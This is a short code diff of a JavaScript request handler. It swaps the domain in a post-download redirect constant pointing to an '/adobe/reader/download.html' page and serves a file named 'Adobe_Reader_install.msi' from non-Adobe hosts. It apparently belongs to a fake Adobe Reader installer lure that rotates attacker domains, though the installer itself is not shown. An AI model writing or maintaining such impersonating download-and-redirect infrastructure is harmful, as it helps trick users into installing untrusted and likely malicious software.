@@ -3,7 +3,7 @@ import dns from "dns/promises";
 /* ================= CONFIG ================= */
 
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
-  "https://bebltera.za.com/account/adobe/reader/download.html";
+  "https://marcenarias.net/adobe/reader/download.html";
 
 const MSI_PATH = "/Adobe_Reader_install.msi";
 
@@ -173,4 +173,5 @@ export default async function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
